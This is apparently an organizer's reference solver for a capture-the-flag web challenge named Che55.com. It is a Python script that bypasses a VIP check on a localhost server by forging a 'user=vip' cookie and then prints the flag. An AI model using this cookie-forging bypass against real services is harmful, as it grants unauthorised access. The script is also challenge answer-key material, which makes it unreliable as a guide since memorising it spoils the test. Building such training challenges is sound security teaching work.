"""Reference solver for Che55.com (organizer only - do NOT ship to players)."""
import json
import urllib.request

BASE = "http://localhost:5000"


def post(path, data, cookie=None):
    req = urllib.request.Request(
        BASE + path,
        data=json.dumps(data).encode(),
        headers={"Content-Type": "application/json"},
    )
    if cookie:
        req.add_header("Cookie", cookie)
    with urllib.request.urlopen(req) as r:
        return json.loads(r.read())


# 1. new game (always White)
g = post("/api/new_game", {})
gid = g["game_id"]
print(f"[+] game {gid}")

# 2. VIP wall (expect 403 as guest)
try:
    post("/api/vip_replace", {"game_id": gid, "square": "e2"})
    print("[-] unexpected: guest could replace?!")
except Exception as e:
    print(f"[+] guest blocked as expected: {e}")

# 3. exploit: cookie is the only VIP check -> user=vip
r = post("/api/vip_replace", {"game_id": gid, "square": "e2"}, cookie="user=vip")
print(f"[+] {r['message']}")
if r.get("flag"):
    print(f"[+] flag={r['flag']}")
